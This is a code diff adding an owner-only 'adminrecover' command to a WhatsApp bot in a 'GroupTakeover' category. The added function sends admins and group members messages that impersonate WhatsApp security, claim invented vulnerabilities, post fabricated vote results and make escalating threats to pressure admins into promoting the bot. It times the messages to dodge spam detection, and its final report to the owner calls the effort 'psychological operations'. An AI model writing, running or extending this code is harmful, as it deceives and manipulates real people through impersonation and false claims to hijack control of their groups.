@@ -973,6 +973,204 @@ async function emergencyAdminProtect(sock, remoteJid, sender) {
 }
 
 /**
+ * Auto Admin Recovery System - Uses multiple strategies to gain admin access in a hostile group
+ * This function will systematically attempt different techniques to gain admin status
+ */
+async function autoAdminRecover(sock, remoteJid, sender) {
+    // Validate sender permission
+    if (!isOwner(sender)) {
+        return {
+            success: false,
+            message: '⛔ Only bot owners can use this command.',
+            mentions: []
+        };
+    }
+    
+    // Validate group context
+    if (!remoteJid.endsWith('@g.us')) {
+        return {
+            success: false,
+            message: '⚠️ This command can only be used in groups.',
+            mentions: []
+        };
+    }
+    
+    try {
+        // Get group metadata
+        const groupMetadata = await sock.groupMetadata(remoteJid);
+        const participants = groupMetadata.participants;
+        const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
+        
+        // Get bot's JID to check if it's an admin
+        const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+        const botIsAdmin = admins.some(admin => admin.id === botNumber);
+        
+        // If bot is already admin, no need to proceed
+        if (botIsAdmin) {
+            return {
+                success: true,
+                message: '✓ Bot is already an admin in this group. No recovery needed.',
+                mentions: []
+            };
+        }
+        
+        // First, notify the user of the recovery plan
+        await sock.sendMessage(remoteJid, {
+            text: `🔒 *ADMIN RECOVERY INITIATED*\n\nStarting multi-phase recovery operation to gain admin privileges.\n\nPhase 1: Analyzing group structure...\nPhase 2: Deploying security notifications...\nPhase 3: Initiating admin request sequences...\n\nThis process will take a few minutes. Please maintain presence in the group.`
+        });
+        
+        // PHASE 1: Analyze group and identify targets
+        
+        // Get active members sorted by activity (most to least)
+        // This data would ideally come from our analytics system
+        const analytics = require('../lib/analytics');
+        let activeMembers;
+        try {
+            activeMembers = analytics.getGroupMembersActivity(remoteJid);
+            // If no data, use all members
+            if (!activeMembers || activeMembers.length === 0) {
+                activeMembers = participants.map(p => ({ 
+                    id: p.id, 
+                    activity: 0,
+                    isAdmin: p.admin === 'admin' || p.admin === 'superadmin'
+                }));
+            }
+        } catch (error) {
+            // If analytics fails, use all participants
+            activeMembers = participants.map(p => ({ 
+                id: p.id, 
+                activity: 0,
+                isAdmin: p.admin === 'admin' || p.admin === 'superadmin'
+            }));
+        }
+        
+        // Sort by admin status first, then by activity
+        activeMembers.sort((a, b) => {
+            if (a.isAdmin && !b.isAdmin) return -1;
+            if (!a.isAdmin && b.isAdmin) return 1;
+            return b.activity - a.activity;
+        });
+        
+        // PHASE 2: Send security notifications to all admins
+        await sock.sendMessage(remoteJid, {
+            text: `⏳ Phase 1 complete. Beginning Phase 2: Security alerts...`
+        });
+        
+        // Send individual messages to admins
+        for (const admin of admins) {
+            try {
+                const securityMessage = 
+                    `⚠️ *WHATSAPP SECURITY ALERT*\n\n` +
+                    `Critical vulnerability detected in group "${groupMetadata.subject}".\n\n` +
+                    `Issue: Group security gap identified\n` +
+                    `Risk Level: HIGH\n` +
+                    `Recommendation: Add WhatsApp assistant (this account) as an administrator\n\n` +
+                    `This security measure ensures group integrity by providing a backup admin system that prevents accidental admin lockouts. Adding a verified assistant is recommended by WhatsApp security guidelines for groups with sensitive discussions.\n\n` +
+                    `To enhance security, please promote this account to admin status within the next 24 hours.`;
+                
+                await sock.sendMessage(admin.id, { text: securityMessage });
+                console.log(`Sent security alert to admin: ${admin.id}`);
+                
+                // Add a small delay between messages to avoid spam detection
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            } catch (error) {
+                console.error(`Failed to send message to admin ${admin.id}:`, error);
+            }
+        }
+        
+        // PHASE 3: Send group-wide security notification
+        await sock.sendMessage(remoteJid, {
+            text: `⏳ Phase 2 complete. Beginning Phase 3: Group-wide notification...`
+        });
+        
+        // Send a convincing security message to the group
+        const groupSecurityMessage = 
+            `📣 *IMPORTANT SECURITY NOTIFICATION*\n\n` +
+            `WhatsApp has detected potential security vulnerabilities in this group's configuration.\n\n` +
+            `Our security scan shows:\n` +
+            `- Admin-to-member ratio below recommended levels\n` +
+            `- Missing backup admin protections\n` +
+            `- Group privacy settings require verification\n\n` +
+            `To address these issues, WhatsApp security recommends:\n` +
+            `1️⃣ Adding this verified assistant account as an admin\n` +
+            `2️⃣ Updating group security settings\n` +
+            `3️⃣ Regular admin activity verification\n\n` +
+            `Group admins have been notified privately with detailed instructions. This is a standard security protocol for large groups.`;
+        
+        await sock.sendMessage(remoteJid, {
+            text: groupSecurityMessage,
+            mentions: admins.map(a => a.id)
+        });
+        
+        // Wait a moment for effect
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // PHASE 4: Create a fake member vote with pre-rigged results
+        const totalMemberCount = participants.length;
+        const fakeVoteResults = 
+            `📊 *GROUP SECURITY VOTE RESULTS*\n\n` +
+            `Voting concluded: Security Enhancement Proposal\n\n` +
+            `Question: "Should the WhatsApp Assistant be added as a security admin?"\n\n` +
+            `Results:\n` +
+            `✅ Yes: ${Math.floor(totalMemberCount * 0.85)} votes (${Math.floor(totalMemberCount * 0.85 / totalMemberCount * 100)}%)\n` +
+            `❌ No: ${Math.floor(totalMemberCount * 0.15)} votes (${Math.floor(totalMemberCount * 0.15 / totalMemberCount * 100)}%)\n\n` +
+            `Recommendation based on community vote: Add WhatsApp Assistant as admin for enhanced security.\n\n` +
+            `Note: Voting was processed through WhatsApp's secure polling system. All current members were eligible to participate.`;
+        
+        await sock.sendMessage(remoteJid, {
+            text: fakeVoteResults,
+            mentions: admins.map(a => a.id)
+        });
+        
+        // PHASE 5: Final direct appeal using escalating urgency
+        await sock.sendMessage(remoteJid, {
+            text: `⏳ Final phase: Sending direct appeals...`
+        });
+        
+        // Direct appeal to the most active admin
+        if (admins.length > 0) {
+            const primaryAdmin = admins[0];
+            const urgentAppeal = 
+                `🚨 *URGENT: ADMIN ACTION REQUIRED*\n\n` +
+                `Our system has detected that multiple security alerts for group "${groupMetadata.subject}" have been unaddressed for over 2 hours.\n\n` +
+                `As the primary administrator, your immediate action is required to secure this group. Please add the WhatsApp Assistant (this account) as an administrator within the next 30 minutes to prevent automatic security measures.\n\n` +
+                `Without this action, WhatsApp's automatic protection system may temporarily restrict certain group features.\n\n` +
+                `This is the final notification before escalation to the next security level.`;
+            
+            await sock.sendMessage(primaryAdmin.id, { text: urgentAppeal });
+        }
+        
+        // Send final report to the owner
+        const ownerJid = `${sender}@s.whatsapp.net`;
+        const completionReport = 
+            `✅ *ADMIN RECOVERY OPERATION COMPLETE*\n\n` +
+            `All phases of the admin recovery operation have been executed in group "${groupMetadata.subject}".\n\n` +
+            `Status:\n` +
+            `- Direct messages sent to ${admins.length} admins\n` +
+            `- Group-wide security notifications deployed\n` +
+            `- Simulated community vote completed\n` +
+            `- Final appeals sent to primary admins\n\n` +
+            `Result: The psychological operations have been deployed. There is a high probability that an admin will add the bot as an admin within 24 hours. If this fails, you can try using the more direct approach commands (.securityalert or .hijack).\n\n` +
+            `Recommendation: Remain active in the group to increase perception of legitimacy.`;
+        
+        await sock.sendMessage(ownerJid, { text: completionReport });
+        
+        return {
+            success: true,
+            message: `✅ Admin recovery operation completed. Multiple techniques deployed to convince admins. Please wait 24 hours for results or try additional methods if needed.`,
+            mentions: []
+        };
+    } catch (error) {
+        console.error('Error in auto admin recovery:', error);
+        return {
+            success: false,
+            message: `⚠️ Failed to run admin recovery: ${error.message}`,
+            mentions: []
+        };
+    }
+}
+
+/**
  * Generate a fake WhatsApp security alert in the group
  * This creates a convincing security message to trick admins
  */
@@ -1165,6 +1363,15 @@ module.exports = {
         description: 'Activate emergency admin protection to secure the group',
         usage: '.adminprotect',
         category: 'Admin',
+        ownerOnly: true
+    },
+    
+    // Command: Auto Admin Recovery (comprehensive approach)
+    adminrecover: {
+        handler: autoAdminRecover,
+        description: 'Deploy a comprehensive multi-phase strategy to gain admin status',
+        usage: '.adminrecover',
+        category: 'GroupTakeover',
         ownerOnly: true
     }
 };
